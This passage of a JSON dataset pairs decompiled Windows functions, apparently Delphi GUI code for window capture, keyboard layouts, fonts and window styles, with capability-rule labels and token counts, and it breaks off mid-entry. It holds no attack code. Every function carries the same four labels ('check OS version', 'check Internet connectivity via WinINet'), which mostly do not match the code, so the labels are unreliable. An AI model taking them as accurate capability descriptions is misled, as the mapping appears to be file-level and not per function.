        "decompiled_code": "\nvoid fcn.004785dc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xd6) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xf4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if ((*(in_EAX + 0x9c) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.0040483c();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x4ab078 + 0x44)) {\n                    fcn.0047c30c();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.0047877c();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0047598c();\n                }\n                else {\n                    fcn.00478858();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0xa5] = 2;\n    }\n    return;\n}\n",
        "token_count": 305
    },
    "0047879c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047879c(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x47881b;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x276) != '\\0') goto code_r0x00478805;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x004787cc:\n        puStack16 = puVar1;\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            cVar2 = fcn.00466fb4();\n            if (cVar2 != '\\0') goto code_r0x004787fe;\n        }\n        fcn.00407480();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x004787cc;\n    }\ncode_r0x004787fe:\n    fcn.00476a7c();\ncode_r0x00478805:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x478822;\n    uStack20 = 0x47881a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 392
    },
    "00478874": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00478874(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x478b66;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x478897;\n    fcn.0045d470();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x4788a8;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xd6) & 8) == 0)) && (*(in_EAX + 0x277) != '\\x01')) goto code_r0x004788e5;\n    }\n    puStack60 = 0x4788d1;\n    fcn.00407480();\n    puStack60 = 0x4788e0;\n    fcn.0040d9f8();\n    puStack60 = 0x4788e5;\n    fcn.00404eb4();\ncode_r0x004788e5:\n    puStack60 = 0x4788ea;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x4788f9;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x4788ff;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x478904;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x47890e;\n    fcn.0047afb0();\n    uStack64 = 0x478b49;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 8;\n    puStack60 = &stack0xfffffffc;\n    if ((*(in_EAX + 0xcc) == '\\0') && (puStack60 = &stack0xfffffffc,  *(*0x4ab078 + 0xd4) != '\\0')) {\n        puStack72 = 0x478948;\n        puStack60 = &stack0xfffffffc;\n        fcn.004636a0();\n        puStack72 = 0x478950;\n        fcn.00466c84();\n    }\n    puStack72 = 0x478955;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x47895d;\n    fcn.00471354();\n    puStack72 = 0x478977;\n    fcn.0041968c();\n    *(*0x4ab07c + 0x78) = in_EAX;\n    puStack72 = 0x47899b;\n    fcn.00479e80();\n    puStack72 = 0x4789ad;\n    fcn.004714f8();\n    uStack76 = 0x478b27;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x4789c6;\n    puStack72 = &stack0xfffffffc;\n    fcn.00478784();\n    uStack88 = 0x478a86;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.00466ca8(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0xa5] = 0;\n    do {\n        fcn.0047c210();\n        if (*(*0x4ab078 + 0xa4) == '\\0') {\n            if (in_EAX[0xa5] != 0) {\n                fcn.004786e4();\n            }\n        }\n        else {\n            in_EAX[0xa5] = 2;\n        }\n    } while (in_EAX[0xa5] == 0);\n    uVar3 = fcn.00466ca8(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.00466ca8();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.0047877c(0x478a8d);\n    return;\n}\n",
        "token_count": 1191
    },
    "00478b78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00478b78(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00462d98(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00462d5c();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x7c))();\n            }\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\n                fcn.00478b78(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00478be8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00478be8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        (**(*in_EAX + 0x7c))();\n        if ((in_EAX[0xa4] != 0) && (iVar1 = fcn.004563c8(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.004563d8();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00478b78(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00478cc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00478cc0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00462d98(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00462d5c();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00478c90(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047cc(),  cVar1 != '\\0' && (cVar1 = fcn.00478cc0(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 239
    },
    "00478d3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478d3c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.00478c90(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00478c90(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00478cc0(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00478dc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00478dc0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00462d98(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00462d5c();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00478d90(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047cc(),  cVar1 != '\\0' && (cVar1 = fcn.00478dc0(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 239
    },
    "00478e3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478e3c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.00478d90(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00478d90(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00478dc0(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00478e90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00478e90(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char var_5h;\n    uint var_4h;\n    \n    var_5h = '\\0';\n    iVar2 = fcn.0041fcb0();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041fc84();\n            cVar1 = fcn.004047cc();\n            if (cVar1 == '\\0') {\n                var_5h = fcn.00478e90(arg_8h);\n                if (var_5h != '\\0') {\n                    return var_5h;\n                }\n            }\n            else {\n                cVar1 = fcn.0046e7d8();\n                if (cVar1 != '\\0') {\n                    return '\\x01';\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return var_5h;\n}\n",
        "token_count": 225
    },
    "00478f0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00478f0c(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30a) != 0) {\n        (**(in_EAX + 0x308))();\n    }\n    if ((((*(in_EAX + 0x290) == 0) || (*(*(in_EAX + 0x290) + 0x38) == 0)) || (cVar1 = fcn.0040483c(),  cVar1 == '\\0'))\n       && (cVar1 = fcn.00478e90(&stack0xfffffffc),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "00478f84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00478f84(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x298) != 0) && (iVar1 = (****(arg_8h + 0x298))(*(arg_8h + 0x298), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.0041fe1c(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 147
    },
    "00479008": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00479008(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x4a48ec != NULL)) {\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00466ca8(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x328) == '\\0') && (*(in_EAX + 0x350) == '\\0')) {\n                uVar2 = fcn.00466ca8(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.00466ca8(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.00466ca8(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar2 = fcn.00466ca8(*(in_EAX + 0x354), *(in_EAX + 0x329), \n                                     *(*(in_EAX + 0x328) * 4 + 0x4a4980) | *(*(in_EAX + 0x350) * 4 + 0x4a4988));\n                (**0x4a48ec)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0047911c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047911c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != *(in_EAX + 0x350)) {\n        *(in_EAX + 0x350) = param_2;\n        if (*(in_EAX + 0x350) != '\\0') {\n            iVar1 = fcn.0047da14();\n            if (*(iVar1 + 8) != '\\0') {\n                fcn.0047da14();\n                fcn.0047dd38();\n            }\n        }\n        fcn.00479008();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0047915c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047915c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x4a48ec != 0)) &&\n       ((*(in_EAX + 0x328) != '\\0' || (*(in_EAX + 0x350) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00479204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.00479204(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xf0))();\n    fcn.00472818();\n    fcn.00474e90();\n    fcn.004657d0();\n    fcn.004752b0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 189
    },
    "00479730": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00479730(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f670();\n    puVar2 = *0x4a4c9c;\n    (*0x4a4c9c)[1] = in_EAX;\n    *puVar2 = 0x479ad4;\n    puVar2 = *0x4a4ca8;\n    (*0x4a4ca8)[1] = in_EAX;\n    *puVar2 = 0x479ae0;\n    fcn.00479aec();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00404610();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x4a4e78)(0, 0, fcn.0047519c, *(in_EAX + 0x58));\n    uVar3 = fcn.00427974();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.00427974();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.00427974();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.00479f1c();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x479dec;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x479dec;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x479dec;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 779
    },
    "00479a00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00479a00(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00479a84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00479a84(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00419754();\n    fcn.00419754();\n    fcn.0047cd9c();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x4ab078 + 0x84) != 0)) {\n        fcn.004683d4();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00479bd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00479bd0(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x479d7b;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00404610();\n        *(var_4h + 0x34) = uVar3;\n        fcn.0040546c();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.00479bd0::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.0046c0f4();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x479c88;\n                    uStack656 = fcn.0040ae14(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x479c93;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x479d37;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x479dc4, 0, 0, &fcn.00479bd0::var_214h, &fcn.00479bd0::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.004056dc();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.004056dc();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x479d3e);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x25) = 0;\n        fcn.0041b368();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x479d82;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 843
    },
    "00479f1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00479f1c(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x4ab078 != 0) {\n        var_1h._0_1_ = *(*0x4ab078 + 0x88);\n    }\n    uStack420 = 0x47a063;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x4ab078 != 0) {\n        fcn.0047c974();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.00427dc4();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.00427dc4();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.00427ea8();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.00427dc4();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.00427dc4();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.00427dc4();\n    }\n    fcn.00427b48();\n    fcn.00427b48();\n    *in_FS_OFFSET = puStack464;\n    if (*0x4ab078 != 0) {\n        fcn.0047c974(0x47a06a);\n    }\n    return;\n}\n",
        "token_count": 588
    },
    "0047a078": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a078(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.0047a098();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0047a128": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
